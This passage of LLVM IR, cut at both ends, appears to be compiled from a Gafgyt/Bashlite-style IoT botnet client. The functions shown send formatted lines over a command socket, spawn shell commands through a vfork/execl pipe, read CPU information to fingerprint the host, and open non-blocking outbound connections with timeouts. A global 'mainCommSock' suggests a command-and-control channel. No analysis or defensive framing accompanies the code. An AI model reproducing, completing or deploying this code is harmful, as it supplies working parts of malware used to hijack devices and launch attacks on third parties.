  %4 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  %5 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %6 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %6)
  %7 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %5)
  ret i32 %7
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  %5 = tail call noalias i8* @malloc(i64 2048) #3
  store i8* %5, i8** %3, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 2048, i32 1, i1 false)
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %7 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %7)
  %8 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %6)
  call void @llvm.va_end(i8* nonnull %7)
  %9 = call i64 @strlen(i8* %5) #15
  %10 = getelementptr inbounds i8, i8* %5, i64 %9
  store i8 10, i8* %10, align 1
  %11 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.38, i64 0, i64 0), i8* %5)
  %12 = call i64 @strlen(i8* %5) #15
  %13 = call i64 @send(i32 %0, i8* %5, i64 %12, i32 16384) #3
  %14 = trunc i64 %13 to i32
  call void @free(i8* %5) #3
  ret i32 %14
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #5

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8* nocapture readonly) local_unnamed_addr #1 {
  %3 = alloca [2 x i32], align 4
  %4 = load i8, i8* %1, align 1
  switch i8 %4, label %78 [
    i8 114, label %5
    i8 119, label %5
  ]

; <label>:5:                                      ; preds = %2, %2
  %6 = getelementptr inbounds i8, i8* %1, i64 1
  %7 = load i8, i8* %6, align 1
  %8 = icmp eq i8 %7, 0
  br i1 %8, label %9, label %78

; <label>:9:                                      ; preds = %5
  %10 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 0
  %11 = call i32 @pipe(i32* nonnull %10) #3
  %12 = icmp slt i32 %11, 0
  br i1 %12, label %78, label %13

; <label>:13:                                     ; preds = %9
  %14 = load i32*, i32** @fdopen_pids, align 8
  %15 = icmp eq i32* %14, null
  br i1 %15, label %16, label %26

; <label>:16:                                     ; preds = %13
  %17 = call i32 @getdtablesize() #3
  %18 = icmp slt i32 %17, 1
  br i1 %18, label %78, label %19

; <label>:19:                                     ; preds = %16
  %20 = sext i32 %17 to i64
  %21 = shl nsw i64 %20, 2
  %22 = and i64 %21, 4294967292
  %23 = call noalias i8* @malloc(i64 %22) #3
  store i8* %23, i8** bitcast (i32** @fdopen_pids to i8**), align 8
  %24 = icmp eq i8* %23, null
  br i1 %24, label %78, label %25

; <label>:25:                                     ; preds = %19
  call void @llvm.memset.p0i8.i64(i8* nonnull %23, i8 0, i64 %21, i32 1, i1 false)
  br label %26

; <label>:26:                                     ; preds = %25, %13
  %27 = call i32 @vfork() #16
  switch i32 %27, label %61 [
    i32 -1, label %28
    i32 0, label %34
  ]

; <label>:28:                                     ; preds = %26
  %29 = load i32, i32* %10, align 4
  %30 = call i32 @close(i32 %29) #3
  %31 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %32 = load i32, i32* %31, align 4
  %33 = call i32 @close(i32 %32) #3
  br label %78

; <label>:34:                                     ; preds = %26
  %35 = load i8, i8* %1, align 1
  %36 = icmp eq i8 %35, 114
  br i1 %36, label %37, label %48

; <label>:37:                                     ; preds = %34
  %38 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %39 = load i32, i32* %38, align 4
  %40 = icmp eq i32 %39, 1
  br i1 %40, label %45, label %41

; <label>:41:                                     ; preds = %37
  %42 = call i32 @dup2(i32 %39, i32 1) #3
  %43 = load i32, i32* %38, align 4
  %44 = call i32 @close(i32 %43) #3
  br label %45

; <label>:45:                                     ; preds = %37, %41
  %46 = load i32, i32* %10, align 4
  %47 = call i32 @close(i32 %46) #3
  br label %59

; <label>:48:                                     ; preds = %34
  %49 = load i32, i32* %10, align 4
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %55, label %51

; <label>:51:                                     ; preds = %48
  %52 = call i32 @dup2(i32 %49, i32 0) #3
  %53 = load i32, i32* %10, align 4
  %54 = call i32 @close(i32 %53) #3
  br label %55

; <label>:55:                                     ; preds = %48, %51
  %56 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %57 = load i32, i32* %56, align 4
  %58 = call i32 @close(i32 %57) #3
  br label %59

; <label>:59:                                     ; preds = %55, %45
  %60 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.39, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.40, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.41, i64 0, i64 0), i8* %0, i8* null) #3
  call void @_exit(i32 127) #17
  unreachable

; <label>:61:                                     ; preds = %26
  %62 = load i8, i8* %1, align 1
  %63 = icmp eq i8 %62, 114
  br i1 %63, label %64, label %69

; <label>:64:                                     ; preds = %61
  %65 = load i32, i32* %10, align 4
  %66 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %67 = load i32, i32* %66, align 4
  %68 = call i32 @close(i32 %67) #3
  br label %74

; <label>:69:                                     ; preds = %61
  %70 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %71 = load i32, i32* %70, align 4
  %72 = load i32, i32* %10, align 4
  %73 = call i32 @close(i32 %72) #3
  br label %74

; <label>:74:                                     ; preds = %69, %64
  %.011 = phi i32 [ %65, %64 ], [ %71, %69 ]
  %75 = load i32*, i32** @fdopen_pids, align 8
  %76 = sext i32 %.011 to i64
  %77 = getelementptr inbounds i32, i32* %75, i64 %76
  store i32 %27, i32* %77, align 4
  br label %78

; <label>:78:                                     ; preds = %19, %16, %9, %5, %2, %74, %28
  %.0 = phi i32 [ %.011, %74 ], [ -1, %28 ], [ -1, %2 ], [ -1, %5 ], [ -1, %9 ], [ -1, %16 ], [ -1, %19 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @getdtablesize() local_unnamed_addr #5

; Function Attrs: nounwind returns_twice
declare i32 @vfork() local_unnamed_addr #7

declare i32 @close(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) local_unnamed_addr #5

; Function Attrs: noreturn
declare void @_exit(i32) local_unnamed_addr #8

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) local_unnamed_addr #1 {
  %2 = alloca %struct.__sigset_t, align 8
  %3 = alloca %struct.__sigset_t, align 8
  %4 = alloca i32, align 4
  %5 = load i32*, i32** @fdopen_pids, align 8
  %6 = icmp eq i32* %5, null
  br i1 %6, label %37, label %7

; <label>:7:                                      ; preds = %1
  %8 = sext i32 %0 to i64
  %9 = getelementptr inbounds i32, i32* %5, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %37, label %12

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @close(i32 %0) #3
  %14 = call i32 @sigemptyset(%struct.__sigset_t* nonnull %3) #3
  %15 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 2) #3
  %16 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 3) #3
  %17 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 1) #3
  %18 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* nonnull %3, %struct.__sigset_t* nonnull %2) #3
  br label %19

; <label>:19:                                     ; preds = %25, %12
  %20 = load i32*, i32** @fdopen_pids, align 8
  %21 = getelementptr inbounds i32, i32* %20, i64 %8
  %22 = load i32, i32* %21, align 4
  %23 = call i32 @waitpid(i32 %22, i32* nonnull %4, i32 0) #3
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %25, label %31

; <label>:25:                                     ; preds = %19
  %26 = tail call i32* @__errno_location() #18
  %27 = load i32, i32* %26, align 4
  %28 = icmp eq i32 %27, 4
  br i1 %28, label %19, label %.critedge

.critedge:                                        ; preds = %25
  %29 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #3
  %30 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %30, align 4
  br label %37

; <label>:31:                                     ; preds = %19
  %32 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #3
  %33 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %33, align 4
  %34 = load i32, i32* %4, align 4
  %35 = lshr i32 %34, 8
  %36 = and i32 %35, 255
  br label %37

; <label>:37:                                     ; preds = %.critedge, %31, %1, %7
  %.0 = phi i32 [ -1, %7 ], [ -1, %1 ], [ %36, %31 ], [ -1, %.critedge ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) local_unnamed_addr #5

declare i32 @waitpid(i32, i32*, i32) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #9

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %3
  %5 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %6 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %7 = getelementptr inbounds i8, i8* %6, i64 -1
  %8 = load i8, i8* %7, align 1
  %9 = icmp eq i8 %8, 10
  br i1 %9, label %.critedge.loopexit, label %10

; <label>:10:                                     ; preds = %.lr.ph
  %11 = tail call i64 @read(i32 %2, i8* %6, i64 1) #3
  %12 = trunc i64 %11 to i32
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %13 = icmp eq i32 %12, 1
  %14 = icmp slt i64 %indvars.iv.next, %5
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %10
  %.011.lcssa.ph = phi i32 [ 1, %.lr.ph ], [ %12, %10 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %3
  %.011.lcssa = phi i32 [ 1, %3 ], [ %.011.lcssa.ph, %.critedge.loopexit ]
  %15 = icmp eq i32 %.011.lcssa, 0
  %16 = select i1 %15, i8* null, i8* %0
  ret i8* %16
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #4

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i64 @parseHex(i8* nocapture readonly) local_unnamed_addr #10 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %11, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.05 = phi i64 [ %10, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.034 = phi i8* [ %6, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = shl i64 %.05, 4
  %6 = getelementptr inbounds i8, i8* %.034, i64 1
  %7 = zext i8 %4 to i64
  %8 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %7
  %9 = load i64, i64* %8, align 8
  %10 = or i64 %9, %5
  %11 = load i8, i8* %6, align 1
  %12 = icmp ne i8 %11, 0
  %13 = icmp sgt i64 %10, -1
  %14 = and i1 %13, %12
  br i1 %14, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.0.lcssa = phi i64 [ 0, %1 ], [ %10, %._crit_edge.loopexit ]
  ret i64 %.0.lcssa
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @wildString(i8* readonly, i8* readonly) local_unnamed_addr #11 {
  %3 = load i8, i8* %0, align 1
  switch i8 %3, label %32 [
    i8 0, label %4
    i8 42, label %7
    i8 63, label %21
  ]

; <label>:4:                                      ; preds = %2
  %5 = load i8, i8* %1, align 1
  %6 = zext i8 %5 to i32
  br label %47

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds i8, i8* %0, i64 1
  %9 = tail call i32 @wildString(i8* %8, i8* %1)
  %10 = icmp eq i32 %9, 0
  br i1 %10, label %18, label %11

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* %1, align 1
  %13 = icmp eq i8 %12, 0
  br i1 %13, label %18, label %14

; <label>:14:                                     ; preds = %11
  %15 = getelementptr inbounds i8, i8* %1, i64 1
  %16 = tail call i32 @wildString(i8* nonnull %0, i8* %15)
  %17 = icmp ne i32 %16, 0
  br label %18

; <label>:18:                                     ; preds = %11, %7, %14
  %19 = phi i1 [ false, %7 ], [ true, %11 ], [ %17, %14 ]
  %20 = zext i1 %19 to i32
  br label %47

; <label>:21:                                     ; preds = %2
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %29, label %24

; <label>:24:                                     ; preds = %21
  %25 = getelementptr inbounds i8, i8* %0, i64 1
  %26 = getelementptr inbounds i8, i8* %1, i64 1
  %27 = tail call i32 @wildString(i8* %25, i8* %26)
  %28 = icmp ne i32 %27, 0
  br label %29

; <label>:29:                                     ; preds = %21, %24
  %30 = phi i1 [ true, %21 ], [ %28, %24 ]
  %31 = zext i1 %30 to i32
  br label %47

; <label>:32:                                     ; preds = %2
  %33 = zext i8 %3 to i32
  %34 = tail call i32 @toupper(i32 %33) #15
  %35 = load i8, i8* %1, align 1
  %36 = zext i8 %35 to i32
  %37 = tail call i32 @toupper(i32 %36) #15
  %38 = icmp eq i32 %34, %37
  br i1 %38, label %39, label %44

; <label>:39:                                     ; preds = %32
  %40 = getelementptr inbounds i8, i8* %0, i64 1
  %41 = getelementptr inbounds i8, i8* %1, i64 1
  %42 = tail call i32 @wildString(i8* %40, i8* %41)
  %43 = icmp ne i32 %42, 0
  br label %44

; <label>:44:                                     ; preds = %39, %32
  %45 = phi i1 [ true, %32 ], [ %43, %39 ]
  %46 = zext i1 %45 to i32
  br label %47

; <label>:47:                                     ; preds = %44, %29, %18, %4
  %.0 = phi i32 [ %46, %44 ], [ %31, %29 ], [ %20, %18 ], [ %6, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr* nocapture) local_unnamed_addr #1 {
  %3 = tail call i32 @inet_addr(i8* %0) #3
  %4 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1, i64 0, i32 0
  store i32 %3, i32* %4, align 4
  %5 = icmp eq i32 %3, -1
  %. = zext i1 %5 to i32
  ret i32 %.
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8* nocapture) local_unnamed_addr #1 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %9, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.04 = phi i8* [ %8, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = zext i8 %4 to i32
  %6 = tail call i32 @toupper(i32 %5) #15
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* %.04, align 1
  %8 = getelementptr inbounds i8, i8* %.04, i64 1
  %9 = load i8, i8* %8, align 1
  %10 = icmp eq i8 %9, 0
  br i1 %10, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) local_unnamed_addr #1 {
  %2 = alloca [4096 x i8], align 16
  %3 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.42, i64 0, i64 0), i32 0) #3
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %5 = call i8* @fdgets(i8* nonnull %4, i32 4096, i32 %3)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %24
  call void @uppercase(i8* nonnull %4)
  %strncmp = call i32 @strncmp(i8* nonnull %4, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i64 0, i64 0), i64 8)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %7, label %24

; <label>:7:                                      ; preds = %.lr.ph
  %8 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 8
  br label %9

; <label>:9:                                      ; preds = %.critedge, %7
  %.0 = phi i8* [ %8, %7 ], [ %11, %.critedge ]
  %10 = load i8, i8* %.0, align 1
  switch i8 %10, label %.preheader.preheader [
    i8 32, label %.critedge
    i8 9, label %.critedge
    i8 58, label %.critedge
  ]

.preheader.preheader:                             ; preds = %9
  br label %.preheader

.critedge:                                        ; preds = %9, %9, %9
  %11 = getelementptr inbounds i8, i8* %.0, i64 1
  br label %9

.preheader:                                       ; preds = %.preheader.preheader, %16
  %12 = call i64 @strlen(i8* %.0) #15
  %13 = add i64 %12, -1
  %14 = getelementptr inbounds i8, i8* %.0, i64 %13
  %15 = load i8, i8* %14, align 1
  switch i8 %15, label %17 [
    i8 13, label %16
    i8 10, label %16
  ]

; <label>:16:                                     ; preds = %.preheader, %.preheader
  store i8 0, i8* %14, align 1
  br label %.preheader

; <label>:17:                                     ; preds = %.preheader
  %18 = call i8* @strchr(i8* nonnull %.0, i32 46) #15
  %19 = icmp eq i8* %18, null
  br i1 %19, label %21, label %20

; <label>:20:                                     ; preds = %17
  store i8 0, i8* %18, align 1
  br label %21

; <label>:21:                                     ; preds = %17, %20
  %22 = call i8* @strcpy(i8* %0, i8* nonnull %.0) #3
  %23 = call i32 @close(i32 %3) #3
  br label %28

; <label>:24:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %4, i8 0, i64 4096, i32 16, i1 false)
  %25 = call i8* @fdgets(i8* nonnull %4, i32 4096, i32 %3)
  %26 = icmp eq i8* %25, null
  br i1 %26, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %24
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %27 = call i32 @close(i32 %3) #3
  br label %28

; <label>:28:                                     ; preds = %._crit_edge, %21
  %.017 = phi i32 [ 0, %21 ], [ 1, %._crit_edge ]
  ret i32 %.017
}

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() local_unnamed_addr #1 {
  %1 = alloca [4096 x i8], align 16
  %2 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.42, i64 0, i64 0), i32 0) #3
  %3 = getelementptr inbounds [4096 x i8], [4096 x i8]* %1, i64 0, i64 0
  %4 = call i8* @fdgets(i8* nonnull %3, i32 4096, i32 %2)
  %5 = icmp eq i8* %4, null
  br i1 %5, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %0
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.04 = phi i32 [ %..0, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  call void @uppercase(i8* nonnull %3)
  %strncmp = call i32 @strncmp(i8* nonnull %3, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i64 0, i64 0), i64 8)
  %cmp = icmp eq i32 %strncmp, 0
  %6 = zext i1 %cmp to i32
  %..0 = add nsw i32 %6, %.04
  call void @llvm.memset.p0i8.i64(i8* nonnull %3, i8 0, i64 4096, i32 16, i1 false)
  %7 = call i8* @fdgets(i8* nonnull %3, i32 4096, i32 %2)
  %8 = icmp eq i8* %7, null
  br i1 %8, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %0
  %.0.lcssa = phi i32 [ 0, %0 ], [ %..0, %._crit_edge.loopexit ]
  %9 = call i32 @close(i32 %2) #3
  ret i32 %.0.lcssa
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeRandomStr(i8* nocapture, i32) local_unnamed_addr #0 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %4 = tail call i32 @rand_cmwc()
  %5 = urem i32 %4, 26
  %6 = add nuw nsw i32 %5, 65
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  store i8 %7, i8* %8, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8* nocapture, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %5 to %struct.timeval*
  %6 = alloca i8, align 1
  %7 = sext i32 %2 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %1, i8 0, i64 %7, i32 1, i1 false)
  store <2 x i64> <i64 30, i64 0>, <2 x i64>* %5, align 16
  %8 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 0
  %9 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %8) #3, !srcloc !13
  %10 = srem i32 %0, 64
  %11 = zext i32 %10 to i64
  %12 = shl i64 1, %11
  %13 = sdiv i32 %0, 64
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 %14
  %16 = load i64, i64* %15, align 8
  %17 = or i64 %16, %12
  store i64 %17, i64* %15, align 8
  %18 = add nsw i32 %0, 1
  %19 = call i32 @select(i32 %18, %struct.__sigset_t* nonnull %4, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %4, %struct.timeval* nonnull %tmpcast) #3
  %20 = icmp sgt i32 %2, 1
  br i1 %20, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %29
  %.in = phi i32 [ %21, %29 ], [ %2, %.lr.ph.preheader ]
  %.024 = phi i32 [ %30, %29 ], [ 0, %.lr.ph.preheader ]
  %.01923 = phi i8* [ %27, %29 ], [ %1, %.lr.ph.preheader ]
  %21 = add nsw i32 %.in, -1
  %22 = load i32, i32* @mainCommSock, align 4
  %23 = call i64 @recv(i32 %22, i8* nonnull %6, i64 1, i32 0) #3
  %24 = icmp eq i64 %23, 1
  br i1 %24, label %25, label %._crit_edge.loopexit

; <label>:25:                                     ; preds = %.lr.ph
  %26 = load i8, i8* %6, align 1
  %27 = getelementptr inbounds i8, i8* %.01923, i64 1
  store i8 %26, i8* %.01923, align 1
  %28 = icmp eq i8 %26, 10
  br i1 %28, label %._crit_edge.loopexit, label %29

; <label>:29:                                     ; preds = %25
  %30 = add nuw nsw i32 %.024, 1
  %31 = icmp sgt i32 %21, 1
  br i1 %31, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %29, %25
  %.1.sink.ph = phi i8* [ %.01923, %.lr.ph ], [ %27, %29 ], [ %27, %25 ]
  %.020.ph = phi i32 [ -1, %.lr.ph ], [ %30, %29 ], [ %.024, %25 ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.1.sink = phi i8* [ %1, %3 ], [ %.1.sink.ph, %._crit_edge.loopexit ]
  %.020 = phi i32 [ 0, %3 ], [ %.020.ph, %._crit_edge.loopexit ]
  store i8 0, i8* %.1.sink, align 1
  ret i32 %.020
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) local_unnamed_addr #4

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #3
  %11 = sext i32 %10 to i64
  %12 = or i64 %11, 2048
  %13 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %12) #3
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %14, align 4
  %15 = trunc i32 %2 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #18
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %19 = call i32 @getHost(i8* %1, %struct.in_addr* %18)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %58

; <label>:21:                                     ; preds = %4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %23 = bitcast i8* %22 to i64*
  store i64 0, i64* %23, align 4
  %24 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %0, %struct.sockaddr* nonnull %24, i32 16) #3
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %53

; <label>:27:                                     ; preds = %21
  %28 = tail call i32* @__errno_location() #18
  %29 = load i32, i32* %28, align 4
  %30 = icmp eq i32 %29, 115
  br i1 %30, label %31, label %58

; <label>:31:                                     ; preds = %27
  %32 = sext i32 %3 to i64
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 0
  store i64 %32, i64* %33, align 8
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 1
  store i64 0, i64* %34, align 8
  %35 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 0
  %36 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %35) #3, !srcloc !14
  %37 = srem i32 %0, 64
  %38 = zext i32 %37 to i64
  %39 = shl i64 1, %38
  %40 = sdiv i32 %0, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %39
  store i64 %44, i64* %42, align 8
